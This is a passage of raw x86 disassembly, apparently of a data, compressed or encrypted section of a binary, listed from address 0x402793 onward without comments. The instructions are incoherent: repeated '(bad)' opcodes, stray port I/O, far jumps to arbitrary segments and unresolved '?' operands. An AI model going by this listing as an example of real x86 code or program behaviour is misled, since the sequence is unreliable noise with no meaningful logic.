  402793:	fsub   st(4),st
  402795:	xor    eax,0x6b10b182
  40279a:	cwde   
  40279b:	retf   0xc4a7
  40279e:	push   cs
  40279f:	fldenv [eax+0x52]
  4027a2:	(bad)  
  4027a3:	xor    al,0x13
  4027a5:	and    BYTE PTR [eax+0x11a74414],0x43
  4027ac:	xchg   ecx,eax
  4027ad:	xor    DWORD PTR [edi-0x5c83de4],edx
  4027b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b4:	xchg   edi,eax
  4027b5:	push   ebp
  4027b6:	retf   0xfb6f
  4027b9:	sbb    bl,al
  4027bb:	aad    0x66
  4027bd:	lock shr DWORD PTR [ebp+edx*1-0x4fe3defe],1
  4027c5:	repnz lahf 
  4027c7:	xchg   edx,eax
  4027c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027c9:	mov    WORD PTR [ebx+0x72ffbed6],cs
  4027cf:	jge    0x40282b
  4027d1:	pushf  
  4027d2:	sub    DWORD PTR [edi+0x5e1c72e6],ebx
  4027d8:	lods   eax,DWORD PTR ds:[esi]
  4027d9:	cs call 0x7913472f
  4027df:	rcl    dl,1
  4027e1:	mov    ebp,0x465b290f
  4027e6:	in     eax,dx
  4027e7:	sub    al,0xb8
  4027e9:	mov    al,ds:0x830143f3
  4027ee:	ret    0x684c
  4027f1:	ret    
  4027f2:	in     eax,0x6e
  4027f4:	dec    ecx
  4027f5:	lods   al,BYTE PTR ds:[esi]
  4027f6:	fadd   DWORD PTR [edi-0x24]
  4027f9:	push   es
  4027fa:	cmp    eax,esp
  4027fc:	xchg   esp,eax
  4027fd:	loope  0x4027bb
  4027ff:	in     eax,0x84
  402801:	cmp    ah,BYTE PTR [edx]
  402803:	push   es
  402804:	(bad)  
  402805:	std    
  402806:	mov    eax,ds:0xce41b5d5
  40280b:	sbb    BYTE PTR [ecx-0x24],ah
  40280e:	ds mov gs:0xe1628b4,al
  402815:	bound  ebp,QWORD PTR [edx-0x4bdb7489]
  40281b:	lods   al,BYTE PTR ds:[esi]
  40281c:	mov    dh,0x87
  40281e:	inc    ebp
  40281f:	stos   DWORD PTR es:[edi],eax
  402820:	mul    BYTE PTR [ecx]
  402822:	add    eax,0x1d402870
  402827:	shl    DWORD PTR [esi+esi*2+0x4f],cl
  40282b:	mov    edx,0xcebdadb1
  402830:	out    dx,al
  402831:	xchg   ebx,eax
  402832:	ds inc ebx
  402834:	ins    BYTE PTR es:[edi],dx
  402835:	jo     0x4027ed
  402837:	add    eax,0x77af3faf
  40283c:	stos   BYTE PTR es:[edi],al
  40283d:	inc    esi
  40283e:	test   DWORD PTR [edx-0x33],esp
  402841:	fadd   DWORD PTR [esi+0x386f1a82]
  402847:	retf   
  402848:	push   edx
  402849:	pop    es
  40284a:	retf   0x2d45
  40284d:	cmp    al,0xe3
  40284f:	mov    eax,ds:0x5f2ad6d1
  402854:	rcl    BYTE PTR [esi-0x6b79eb60],0xa8
  40285b:	inc    edi
  40285c:	mov    ds:0x2ff77f9d,al
  402861:	vpaddsb xmm0,xmm3,XMMWORD PTR [eax-0x4e]
  402866:	jmp    0x8c3cdda5
  40286b:	fdivr  QWORD PTR [ebx+edi*8+0x3b]
  40286f:	pop    ecx
  402870:	adc    ebx,0xe7b7e748
  402876:	jmp    0x54d5:0x75ed61ff
  40287d:	adc    DWORD PTR [eax],edi
  40287f:	mov    ds,WORD PTR [eax]
  402881:	icebp  
  402882:	mov    ah,BYTE PTR [ebx+eiz*8-0x7147b567]
  402889:	sti    
  40288a:	pop    eax
  40288b:	inc    ebp
  40288c:	into   
  40288d:	jo     0x4028dd
  40288f:	daa    
  402890:	sbb    DWORD PTR [ebp+0x75de0e51],ebx
  402896:	pusha  
  402897:	das    
  402898:	dec    ebx
  402899:	sbb    al,0xdf
  40289b:	fld    TBYTE PTR [ebp+0x470cfc74]
  4028a1:	je     0x4028d5
  4028a3:	pop    eax
  4028a4:	mov    ds:0xd6637222,al
  4028a9:	sar    BYTE PTR [esi+0x26],0x5d
  4028ad:	adc    eax,0x2e5376c7
  4028b2:	pop    edx
  4028b3:	fidiv  DWORD PTR [edx+0x65d68119]
  4028b9:	ror    bl,0x2b
  4028bc:	mov    ds:0xc729b22e,eax
  4028c1:	retf   
  4028c2:	dec    ebx
  4028c3:	xchg   edi,eax
  4028c4:	test   eax,0x54bda525
  4028c9:	outs   dx,DWORD PTR ds:[esi]
  4028ca:	xchg   BYTE PTR [eax+0x4a],al
  4028cd:	repnz sub ecx,eax
  4028d0:	add    edi,DWORD PTR [edx-0x114f2e2d]
  4028d6:	into   
  4028d7:	shl    BYTE PTR [ebx-0x4b],1
  4028da:	cmp    BYTE PTR [edx],dh
  4028dc:	rcr    DWORD PTR [edx+0x24],0x8f
  4028e0:	loop   0x4028b0
  4028e2:	xor    al,0xc9
  4028e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028e5:	int    0xc9
  4028e7:	int    0x98
  4028e9:	leave  
  4028ea:	or     al,ch
  4028ec:	jbe    0x402951
  4028ee:	mov    bh,0x25
  4028f0:	and    eax,0x50173562
  4028f5:	aad    0x47
  4028f7:	retf   
  4028f8:	popf   
  4028f9:	mov    dh,BYTE PTR fs:[edx]
  4028fc:	addr16 shl bl,1
  4028ff:	adc    DWORD PTR [ebx+0x1be9e352],0xffffff93
  402906:	or     al,0xc
  402908:	sahf   
  402909:	mov    ds,WORD PTR [eax+ecx*2+0x5546978c]
  402910:	sahf   
  402911:	jge    0x40289a
  402913:	mov    bh,0x2b
  402915:	cwde   
  402916:	cmp    ax,0xebe0
  40291a:	bound  edi,QWORD PTR [edx]
  40291c:	ficom  WORD PTR [esi-0x6f]
  40291f:	je     0x402964
  402921:	jae    0x4028f6
  402923:	std    
  402924:	fwait
  402925:	ins    DWORD PTR es:[edi],dx
  402926:	jbe    0x4028b2
  402928:	mov    ebp,0x475648b4
  40292d:	pop    edx
  40292e:	xor    BYTE PTR [edi-0x76],dh
  402931:	lods   al,BYTE PTR ds:[esi]
  402932:	push   edi
  402933:	fcom   DWORD PTR [esi-0x4f02d21b]
  402939:	push   ecx
  40293a:	or     edi,DWORD PTR [eax+0x1b]
  40293d:	pop    eax
  40293e:	mov    esp,0xa02e6cf9
  402943:	cld    
  402944:	pop    DWORD PTR [esp+edi*4]
  402947:	and    bl,BYTE PTR [edi]
  402949:	test   BYTE PTR ds:0x253b,dl
  40294e:	dec    edx
  40294f:	mov    ds:0x129c8ef2,al
  402954:	push   ecx
  402955:	std    
  402956:	xor    BYTE PTR [edi],0xb4
  402959:	les    edx,FWORD PTR [esp+edi*8-0x47d7a1d9]
  402960:	jmp    0x4029b5
  402962:	test   ebx,esi
  402964:	fisub  DWORD PTR [ebx-0x10b7874c]
  40296a:	test   eax,0xe7988791
  40296f:	adc    bh,BYTE PTR [eax+0x2381c280]
  402975:	mov    esp,0x698fccc2
  40297a:	push   eax
  40297b:	add    DWORD PTR [ebx],esp
  40297d:	(bad)  
  40297e:	cli    
  40297f:	ja     0x40293c
  402981:	in     eax,0x5a
  402983:	xchg   ebx,eax
  402984:	jecxz  0x402924
  402986:	test   DWORD PTR ds:0xce6d0abf,esi
  40298c:	fimul  DWORD PTR [edx]
  40298e:	repnz mov esi,edi
  402991:	jecxz  0x4029c5
  402993:	mov    ?,WORD PTR [eax]
  402995:	jmp    0x7ae4:0xd5a66fa4
  40299c:	jns    0x402a04
  40299e:	jg     0x402a0a
  4029a0:	int3   
  4029a1:	cmp    ebx,DWORD PTR [ebx-0x35866fe8]
  4029a7:	mov    ds:0x9227b14f,eax
  4029ac:	mov    edi,0xe524dce8
  4029b1:	mov    esp,0x83bd6d2b
  4029b6:	dec    edx
  4029b7:	outs   dx,BYTE PTR ds:[esi]
  4029b8:	or     edi,ebp
  4029ba:	add    DWORD PTR [ebx],0xffffffa5
  4029bd:	outs   dx,BYTE PTR ds:[esi]
  4029be:	adc    esp,esp
  4029c0:	je     0x402956
  4029c2:	ret    
  4029c3:	out    dx,eax
  4029c4:	retf   
  4029c5:	mov    ds:0xbb78d710,al
  4029ca:	xor    DWORD PTR [esi],ebp
  4029cc:	inc    edx
  4029cd:	mov    eax,DWORD PTR [esi+0x41f7a9a2]
  4029d3:	ja     0x402a1b
  4029d5:	sbb    eax,0x461fa17f
  4029da:	mov    ebx,0x6489b0ee
  4029df:	jg     0x402a44
  4029e1:	call   0xb49ca813
  4029e6:	mov    edi,edx
  4029e8:	add    cl,BYTE PTR [edi]
  4029ea:	nop
  4029eb:	scas   al,BYTE PTR es:[edi]
  4029ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029ed:	xchg   edi,eax
  4029ee:	test   eax,0x58dd2d72
  4029f3:	cmp    bh,BYTE PTR [bp+di+0x5c]
  4029f7:	inc    ebx
  4029f8:	and    edi,ebp
  4029fa:	call   0x9666be91
  4029ff:	pop    esp
  402a00:	push   0x75
  402a02:	aas    
  402a03:	jnp    0x4029d2
  402a05:	or     DWORD PTR ds:0xc59c4b6c,0xaeb537d0
  402a0f:	sahf   
  402a10:	pop    edx
  402a11:	(bad)  
  402a13:	mov    ebx,0xa2297e5b
  402a18:	lods   eax,DWORD PTR ds:[esi]
  402a19:	fcmove st,st(2)
  402a1b:	jnp    0x402a1b
  402a1d:	sbb    al,0xfd
  402a1f:	dec    esi
  402a20:	sti    
  402a21:	add    eax,0xae24f585
  402a26:	lea    esi,[ecx-0x2d6d8217]
  402a2c:	dec    esp
  402a2d:	inc    ebp
  402a2e:	(bad)  
  402a2f:	cmp    al,dl
  402a31:	or     ah,BYTE PTR [esi-0x3863ef91]
  402a37:	sub    eax,eax
  402a39:	xor    ebp,esp
  402a3b:	fisttp WORD PTR [ebx]
  402a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a3e:	scas   eax,DWORD PTR es:[edi]
  402a3f:	jbe    0x402aa7
  402a41:	mov    es,WORD PTR ds:0xf124ca9c
  402a47:	fst    QWORD PTR [eax-0x35c2dfae]
  402a4d:	fs dec edx
  402a4f:	xor    ebp,DWORD PTR [eax+0x3e6db005]
  402a55:	bound  edi,QWORD PTR [ecx]
  402a57:	mov    DWORD PTR [esi-0x5e],esi
  402a5a:	jle    0x402a0d
  402a5c:	call   0xe9b0:0xab4b690d
  402a63:	shl    BYTE PTR [ebx],1
  402a65:	out    dx,eax
  402a66:	mov    ebx,0x427b7bbc
  402a6b:	pop    eax
  402a6c:	jle    0x402a51
  402a6e:	push   ecx
  402a6f:	shr    BYTE PTR [ebp+0xf92f807],1
  402a75:	mov    ebx,0xced2a543
  402a7a:	sbb    dl,BYTE PTR [edx+0x17c6c2f2]
  402a80:	jg     0x402a65
  402a82:	adc    BYTE PTR [ecx+0x3f],ah
  402a85:	arpl   bx,si
  402a87:	loope  0x402a54
  402a89:	pop    esp
  402a8a:	mov    esi,0xc459e0fb
  402a8f:	sub    al,0x85
  402a91:	xchg   edi,eax
  402a92:	pop    ss
  402a93:	or     edi,DWORD PTR ds:0x32c558a6
  402a99:	sub    al,0xdb
  402a9b:	push   es
  402a9c:	mov    ecx,0x67781fad
  402aa1:	sub    eax,0xb09ce89
  402aa6:	stos   BYTE PTR es:[edi],al
  402aa7:	xor    al,0x27
  402aa9:	adc    BYTE PTR [ebx-0x6c],ah
  402aac:	cmp    ch,dl
  402aae:	cdq    
  402aaf:	lock push esi
  402ab1:	sahf   
  402ab2:	sub    esi,DWORD PTR [ecx]
  402ab4:	sbb    al,ah
  402ab6:	out    0xd,eax
  402ab8:	sub    DWORD PTR [ecx-0x7f],edi
  402abb:	cs sbb al,0x6c
  402abe:	push   edi
  402abf:	imul   ebx,DWORD PTR [esp+edx*2+0x25fb3214],0x8707b3ad
  402aca:	std    
  402acb:	jle    0x402b11
  402acd:	mov    edi,0xce09d09
  402ad2:	retf   0x3bdb
  402ad5:	mov    ecx,0x6d42ee0
  402ada:	pusha  
  402adb:	push   ebp
  402adc:	xlat   BYTE PTR ds:[ebx]
  402add:	or     ebp,DWORD PTR [ecx-0x3e82096d]
  402ae3:	sub    edx,DWORD PTR [edi+0x1]
  402ae6:	(bad)  
  402ae7:	mov    ebx,0x5c2c7423
  402aec:	cmp    edx,DWORD PTR [ebx]
  402aee:	dec    esi
  402aef:	jle    0x402ac2
  402af1:	xor    DWORD PTR [edx],esp
  402af3:	mov    eax,ds:0x901c7f38
  402af8:	mov    edx,0x5365ddda
  402afd:	jbe    0x402b51
  402aff:	jns    0x402a9a
  402b01:	mov    bl,0x13
  402b03:	bnd js 0x402a8d
  402b06:	daa    
  402b07:	test   al,0xac
  402b09:	xchg   ebp,eax
  402b0a:	inc    esi
  402b0b:	inc    ebp
  402b0c:	or     DWORD PTR [edi],esp
  402b0e:	mov    cl,0x38
  402b10:	fcomp  QWORD PTR ds:0x1b7dd41b
  402b16:	jg     0x402b77
  402b18:	out    dx,al
  402b19:	int    0x85
  402b1b:	sub    BYTE PTR [ecx+ecx*2+0x26],bl
  402b1f:	mov    dh,ch
  402b21:	lock push ebx
  402b23:	inc    esi
  402b24:	mov    dl,0x1c
  402b26:	mov    edi,0x15fe6b6c
  402b2b:	push   ss
  402b2c:	and    eax,0x82858242
  402b31:	ret    0x93bc
  402b34:	xchg   bl,dh
  402b36:	mov    dl,0x30
  402b38:	push   cs
  402b39:	mov    dh,0xae
  402b3b:	dec    edi
  402b3c:	adc    DWORD PTR [edi+0x41c65898],ecx
  402b42:	out    dx,eax
  402b43:	and    eax,0x59ecd735
  402b48:	fmul   QWORD PTR [ecx+eax*2]
  402b4b:	jnp    0x402b90
  402b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b4e:	add    BYTE PTR [esi-0x51df5011],dh
  402b54:	push   ss
  402b55:	les    ebx,FWORD PTR [ebx]
  402b57:	sti    
  402b58:	sub    eax,0x3d281785
  402b5d:	add    esi,esp
  402b5f:	jb     0x402bb3
  402b61:	dec    edi
  402b62:	jae    0x402b97
  402b64:	cmp    esp,DWORD PTR [ebp+edi*4+0x69]
  402b68:	cmp    esp,edi
  402b6a:	aaa    
  402b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b6c:	mov    ecx,0x1b75eaa3
  402b71:	push   0x2c
  402b73:	dec    ebx
  402b74:	je     0x402baf
  402b76:	or     DWORD PTR ds:0x84b01af4,eax
  402b7c:	(bad)  
  402b7e:	stos   BYTE PTR es:[edi],al
  402b7f:	aam    0x46
  402b81:	scas   al,BYTE PTR es:[edi]
  402b82:	dec    esi
  402b83:	adc    ebx,DWORD PTR [ecx+0x12]
  402b86:	dec    ebx
  402b87:	adc    BYTE PTR ds:0xe2033fcb,0x75
  402b8e:	outs   dx,DWORD PTR ds:[esi]
  402b8f:	addr16 das 
  402b91:	dec    esi
  402b92:	and    al,0x26
  402b94:	cmp    DWORD PTR [edi+ebp*4-0x7d],ebx
  402b98:	push   ebp
  402b99:	sti    
  402b9a:	cmp    esi,ebp
  402b9c:	mov    esp,0x6ed6d62b
  402ba1:	jns    0x402bfa
  402ba3:	adc    BYTE PTR [esi-0x1b],dl
  402ba6:	popa   
  402ba7:	out    0xce,al
  402ba9:	or     esp,0x4d6c2fc
  402baf:	sub    al,0x2a
  402bb1:	sub    DWORD PTR [esi],edi
  402bb3:	outs   dx,BYTE PTR ds:[esi]
  402bb4:	sbb    BYTE PTR ds:0x2174f6e1,ch
  402bba:	pop    edx
  402bbb:	xchg   edi,eax
  402bbc:	popa   
  402bbd:	inc    esp
  402bbe:	pop    edi
  402bbf:	jnp    0x402bfd
  402bc1:	jb     0x402bef
  402bc3:	out    dx,eax
  402bc4:	stos   DWORD PTR es:[edi],eax
  402bc5:	mov    eax,0x6a009c5a
  402bca:	ret    0x7267
  402bcd:	in     al,dx
  402bce:	aad    0x73
  402bd0:	jno    0x402c47
  402bd2:	loop   0x402c07
  402bd4:	retf   0x533e
  402bd7:	mov    al,ds:0xe43b1178
  402bdc:	pop    es
  402bdd:	in     eax,0x68
  402bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402be0:	outs   dx,BYTE PTR ds:[esi]
  402be1:	add    DWORD PTR [edi+0x5ae0c27f],esp
  402be7:	shl    DWORD PTR [eax],0xdc
  402bea:	test   eax,0x4bf4dda3
  402bef:	(bad)  
  402bf0:	fisttp WORD PTR [edx+0x28]
  402bf3:	push   cs
  402bf4:	xlat   BYTE PTR ds:[ebx]
  402bf5:	gs loope 0x402c20
  402bf8:	outs   dx,BYTE PTR ds:[esi]
  402bf9:	leave  
  402bfa:	(bad)  
  402bfb:	cmp    DWORD PTR [ecx],ebx
  402bfd:	add    eax,0x8d5d995a
  402c02:	out    dx,al
  402c03:	pushf  
  402c04:	add    edi,esp
  402c06:	dec    edi
  402c07:	scas   al,BYTE PTR es:[edi]
  402c08:	std    
  402c09:	xchg   edx,eax
  402c0a:	and    eax,0xecdb0db0
  402c0f:	sub    eax,ebx
  402c11:	push   DWORD PTR [eax-0x4d]
  402c14:	sbb    bl,BYTE PTR [edi-0x51]
  402c17:	std    
  402c18:	and    eax,DWORD PTR [edi-0x3f]
  402c1b:	pop    ss
  402c1c:	sub    al,0x3c
  402c1e:	sub    esp,DWORD PTR [esp+eax*8-0x50]
  402c22:	outs   dx,BYTE PTR ds:[esi]
  402c23:	push   ebx
  402c24:	pop    ss
  402c25:	cli    
  402c26:	dec    esi
  402c27:	ret    0xaa61
  402c2a:	dec    esi
  402c2b:	push   ebx
  402c2c:	jecxz  0x402c0b
  402c2e:	(bad)  
  402c2f:	aas    
  402c30:	push   cs
  402c31:	mov    ch,0xd0
  402c33:	pop    ds
  402c34:	sub    edx,DWORD PTR [edi+0x6a]
  402c37:	adc    BYTE PTR [edx+edx*1],ch
  402c3a:	or     al,0x1e
  402c3c:	xor    eax,0x9ee558d3
  402c41:	and    al,0xa8
  402c43:	and    dh,BYTE PTR [esi+0x3e53d203]
  402c49:	xchg   DWORD PTR [ebp-0xd],ebx
  402c4c:	or     BYTE PTR [ecx-0xddd1012],al
  402c52:	dec    edi
  402c53:	mov    eax,0xf10c3da7
  402c58:	inc    esp
  402c59:	cmp    al,0xbc
  402c5b:	jmp    DWORD PTR [edi-0x629bab8b]
  402c61:	sub    DWORD PTR [eax-0x11],0x6d
  402c65:	popa   
  402c66:	aam    0x88
  402c68:	jmp    0x3938:0xcbf57e5a
  402c6f:	aas    
  402c70:	adc    eax,0x1fb483ec
  402c75:	popf   
  402c76:	and    eax,0xe18d89c2
  402c7b:	inc    ebx
  402c7c:	mov    eax,ds:0xc2c8ea35
  402c81:	stos   DWORD PTR es:[edi],eax
  402c82:	jb     0x402c0c
  402c84:	es xchg ebx,eax
  402c86:	addr16 push ss
  402c88:	adc    DWORD PTR [edx-0x71],eax
  402c8b:	retf   0x8fe8
  402c8e:	pop    esp
  402c8f:	hlt    
  402c90:	div    BYTE PTR [edx+0x2789185f]
  402c96:	add    BYTE PTR [ebx+0x3],ch
  402c99:	repnz scas eax,DWORD PTR es:[edi]
  402c9b:	sbb    esp,edi
  402c9d:	adc    BYTE PTR [ecx],0x41
  402ca0:	repz jl 0x402c8c
  402ca3:	push   cs
  402ca4:	add    eax,0x1b84f437
  402ca9:	or     eax,0xf70e2bf6
  402cae:	xchg   edx,ebx
  402cb0:	cdq    
  402cb1:	(bad)  
  402cb2:	(bad)  
  402cb3:	pusha  
  402cb4:	in     eax,dx
  402cb5:	sbb    ecx,edi
  402cb7:	jmp    0x5dfb:0xf0928ec6
  402cbe:	call   DWORD PTR [ebx]
  402cc0:	or     ah,BYTE PTR [ebx]
  402cc2:	test   eax,0x2c42bbf9
  402cc7:	push   edi
  402cc8:	shl    DWORD PTR [edi-0x7],cl
  402ccb:	in     eax,0x9d
  402ccd:	nop
  402cce:	les    esp,FWORD PTR ds:0x26a5662c
  402cd4:	lock retf 0x8cba
  402cd8:	push   es
  402cd9:	cmp    eax,0xc7f29a2e
  402cde:	hlt    
  402cdf:	out    dx,eax
  402ce0:	jle    0x402ca6
  402ce2:	xchg   ecx,eax
  402ce3:	dec    eax
  402ce4:	in     eax,dx
  402ce5:	push   0x56
  402ce7:	pop    es
  402ce8:	adc    al,0x76
  402cea:	mov    bh,BYTE PTR [edi]
  402cec:	(bad)  
  402ced:	out    0xc8,eax
  402cef:	and    ecx,esi
  402cf1:	pop    esi
  402cf2:	push   es
  402cf3:	mov    ds:0x65711c73,eax
  402cf8:	outs   dx,DWORD PTR ds:[esi]
  402cf9:	lahf   
  402cfa:	cmp    eax,0x9ed2b27b
  402cff:	and    DWORD PTR [edx-0x4f],edi
  402d02:	aas    
  402d03:	xchg   edx,eax
  402d04:	xor    ch,BYTE PTR [ebp+0x7ade82a8]
  402d0a:	sbb    DWORD PTR [eax],esi
  402d0c:	mov    ah,0x97
  402d0e:	leave  
  402d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d10:	(bad)  
  402d11:	inc    ebx
  402d12:	int3   
  402d13:	and    eax,0x3d3a3b2f
  402d18:	mov    eax,0x89780340
  402d1d:	cdq    
  402d1e:	dec    edx
  402d1f:	(bad)  [edx+ecx*1+0x41f584a9]
  402d26:	scas   al,BYTE PTR es:[edi]
  402d27:	mov    ebx,0x6f018117
  402d2c:	push   esp
  402d2d:	mov    edx,0xfeaf94cf
  402d32:	inc    edi
  402d33:	js     0x402d2c
  402d35:	loop   0x402da3
  402d37:	shl    ecx,1
  402d39:	lahf   
  402d3a:	outs   dx,DWORD PTR ds:[esi]
  402d3b:	add    esp,DWORD PTR [ecx]
  402d3d:	sbb    al,dh
  402d3f:	jge    0x402cc3
  402d41:	rcl    DWORD PTR [edi+0xcdbf3cf],cl
  402d47:	js     0x402cea
  402d49:	push   es
  402d4a:	inc    esp
  402d4b:	dec    ebx
  402d4c:	push   edx
  402d4d:	xchg   esi,eax
  402d4e:	xor    ah,BYTE PTR [ebx+0x7c]
  402d51:	inc    esp
  402d52:	fs push esi
  402d54:	int    0xf9
  402d56:	jb     0x402d1f
  402d58:	dec    esp
  402d59:	sbb    edi,DWORD PTR [esi+0x2c]
  402d5c:	pop    esi
  402d5d:	fnsave [ebx+0x36]
  402d60:	sti    
  402d61:	jb     0x402d99
  402d63:	sub    eax,0x18952752
  402d68:	sti    
  402d69:	pop    ds
  402d6a:	add    bh,bh
  402d6c:	jmp    0xfba408d1
  402d71:	mov    bh,0x65
  402d73:	xor    BYTE PTR [edx-0x32dd8c5],ch
  402d79:	pusha  
  402d7a:	fsubp  st(3),st
  402d7c:	aam    0x2d
  402d7e:	sbb    eax,0xdcdcb6e4
  402d83:	lea    edx,[esi]
  402d85:	cdq    
  402d86:	pop    ds
  402d87:	jp     0x402d89
  402d89:	dec    edi
  402d8a:	dec    ebp
  402d8b:	jnp    0x402e02
  402d8d:	jo     0x402de5
  402d8f:	mov    ah,0x44
  402d91:	(bad)  
  402d92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d94:	sub    al,0x26
  402d96:	scas   al,BYTE PTR es:[edi]
  402d97:	dec    ecx
  402d98:	jp     0x402dab
  402d9a:	sub    al,BYTE PTR [esi-0x72b4db8e]
  402da0:	loope  0x402db3
  402da2:	cmp    eax,0x60409170
  402da7:	mov    edx,0x32ca7ca0
  402dac:	mov    eax,0x921f8272
  402db1:	inc    esi
  402db2:	jno    0x402d65
  402db4:	lods   al,BYTE PTR ds:[esi]
  402db5:	mov    ebp,0x54dc5669
  402dba:	sbb    al,0xb3
  402dbc:	sbb    al,0x49
  402dbe:	xchg   esp,eax
  402dbf:	data16 jnp 0x402dc0
  402dc2:	adc    al,0x75
  402dc4:	dec    ecx
  402dc5:	cmp    ebp,ebx
  402dc7:	dec    edi
  402dc8:	mov    WORD PTR [ebx+0x7b6c6709],?
  402dce:	add    BYTE PTR [edx+0x71c44fa6],ah
  402dd4:	repnz into 
  402dd6:	sub    al,0x63
  402dd8:	popf   
  402dd9:	jg     0x402e4b
  402ddb:	pop    ds
  402ddc:	add    bh,bl
  402dde:	repnz fimul DWORD PTR [edi-0x1a]
  402de2:	xchg   ecx,eax
  402de3:	sti    
  402de4:	mov    dh,0xb9
  402de6:	fucomip st,st(6)
  402de8:	leave  
  402de9:	xor    BYTE PTR [ebx+0x2b],0x92
  402ded:	fild   WORD PTR [ebp-0x51013fe]
  402df3:	sbb    al,0xca
  402df5:	sbb    esp,ebx
  402df7:	and    eax,0x7f591e55
  402dfc:	gs stc 
  402dfe:	or     eax,DWORD PTR [eax-0x40]
  402e01:	mov    ecx,0x2f278a36
  402e06:	xchg   edx,eax
  402e07:	dec    ecx
  402e08:	aas    
  402e09:	cdq    
  402e0a:	pop    ds
  402e0b:	inc    edi
  402e0c:	mov    ah,0x66
  402e0e:	imul   ecx,DWORD PTR ds:0xeec1ecbd,0xe9f0c824
  402e18:	or     ecx,DWORD PTR [eax+edi*2-0x4514cfbb]
  402e1f:	mov    esi,0x9e2e9076
  402e24:	sub    DWORD PTR [ecx+ebp*8+0x2517a827],0xffffff9c
  402e2c:	dec    ebx
  402e2d:	cld    
  402e2e:	cdq    
  402e2f:	mov    ah,0xe8
  402e31:	fsub   QWORD PTR [edx+0x1984b0d2]
  402e37:	adc    eax,0x235a833a
  402e3c:	mov    esp,edi
  402e3e:	test   esi,edi
  402e40:	dec    esp
  402e41:	xor    esi,esi
  402e43:	push   edi
  402e44:	daa    
  402e45:	outs   dx,DWORD PTR ds:[esi]
  402e46:	dec    ecx
  402e47:	shl    BYTE PTR [edx-0x2d],1
  402e4a:	repnz push es
  402e4c:	push   ds
  402e4d:	mov    ch,0xea
  402e4f:	and    DWORD PTR [esi-0xc],ebp
  402e52:	imul   ebx,DWORD PTR [ecx+0x0],0x4105e1b
  402e59:	std    
  402e5a:	dec    esi
  402e5b:	std    
  402e5c:	mov    ebx,0x9f077200
  402e61:	cmp    bl,ah
  402e63:	sbb    BYTE PTR [ebp+0x44],ch
  402e66:	test   BYTE PTR [esi+0x4fab03e9],ah
  402e6c:	mov    bh,0x92
  402e6e:	sti    
  402e6f:	xchg   edx,eax
  402e70:	int3   
  402e71:	xchg   ebp,eax
  402e72:	loopne 0x402e62
  402e74:	mov    ch,bh
  402e76:	dec    esp
  402e77:	sub    eax,DWORD PTR [esi-0x63]
  402e7a:	fcom   QWORD PTR [eax-0x350041a]
  402e80:	jecxz  0x402e16
  402e82:	lock or esp,eax
  402e85:	out    dx,al
  402e86:	sub    eax,0xf21542d4
  402e8b:	stc    
  402e8c:	or     DWORD PTR [ebx+0x5c],ebp
  402e8f:	pop    edi
  402e90:	test   DWORD PTR [edx],ebp
  402e92:	ins    BYTE PTR es:[edi],dx
  402e93:	loop   0x402eef
  402e95:	mov    al,ds:0xfbc02578
  402e9a:	ss push 0xffffffed
  402e9d:	sbb    al,0x43
  402e9f:	fadd   st(7),st
  402ea1:	and    bl,BYTE PTR [edx+0x6f]
  402ea4:	xor    ah,BYTE PTR [ebx+0x40]
  402ea7:	push   ds
  402ea8:	test   eax,0x154a6295
  402ead:	mov    bl,0x5
  402eaf:	xchg   ecx,eax
  402eb0:	jge    0x402e44
  402eb2:	mov    ds:0xcd86f9a7,al
  402eb7:	add    al,0x44
  402eb9:	xor    DWORD PTR [ecx-0x12b2cc0],ebx
  402ebf:	adc    eax,0x4801e9d9
  402ec4:	mov    edi,0x309f43d8
  402ec9:	icebp  
  402eca:	xchg   ecx,eax
  402ecb:	push   cs
  402ecc:	test   eax,0xeebb9bfa
  402ed1:	cmp    dh,BYTE PTR [ecx]
  402ed3:	int3   
  402ed4:	pop    ss
  402ed5:	sub    eax,0xab7c7f47
  402eda:	push   ss
  402edb:	aam    0x32
  402edd:	and    DWORD PTR [esi+0x415a893c],ebx
  402ee3:	sti    
  402ee4:	into   
  402ee5:	xchg   dh,bl
  402ee7:	ins    DWORD PTR es:[edi],dx
  402ee8:	fyl2x  
  402eea:	sbb    WORD PTR [esp+ebx*1+0x12],dx
  402eef:	into   
  402ef0:	in     al,0x41
  402ef2:	pop    edi
  402ef3:	add    al,0xc5
  402ef5:	cmp    eax,0x15b2151
  402efa:	ds cdq 
  402efc:	xor    edi,DWORD PTR [eax+eax*1]
  402eff:	popa   
  402f00:	pop    ds
  402f01:	push   ebp
  402f02:	call   0x1fe5:0xfb6d14fe
  402f09:	push   eax
  402f0a:	aas    
  402f0b:	fmul   DWORD PTR cs:[bx+di-0x62]
  402f10:	mov    DWORD PTR [edi],esi
  402f12:	mov    ebp,0xd2d5ef90
  402f17:	mov    bh,0xa5
  402f19:	lods   al,BYTE PTR ds:[esi]
  402f1a:	fwait
  402f1b:	idiv   BYTE PTR [eax]
  402f1d:	mov    ds:0xaef3ac93,al
  402f22:	mov    al,0x2e
  402f24:	dec    ecx
  402f25:	push   cs
  402f26:	push   esi
  402f27:	outs   dx,DWORD PTR ds:[esi]
  402f28:	popf   
  402f29:	mov    esp,0xbcb6640a
  402f2e:	sahf   
  402f2f:	idiv   BYTE PTR [ecx+0x4c980c6d]
  402f35:	sub    DWORD PTR [eax],ebx
  402f37:	bound  edi,QWORD PTR [esp-0x4]
  402f3b:	push   esi
  402f3c:	add    cl,BYTE PTR [ebx]
  402f3e:	mov    dh,0x86
  402f40:	loop   0x402f8a
  402f42:	push   0xa28547a5
  402f47:	sbb    DWORD PTR [eax+eax*8],ebp
  402f4a:	mov    ds:0x400d9f31,eax
  402f4f:	add    esp,DWORD PTR [ebx+0x2b]
  402f52:	adc    edi,DWORD PTR [eax]
  402f54:	ja     0x402f4c
  402f56:	cmc    
  402f57:	sar    DWORD PTR [esi-0x3f],cl
  402f5a:	add    eax,0x6625b8e
  402f5f:	jno    0x402f19
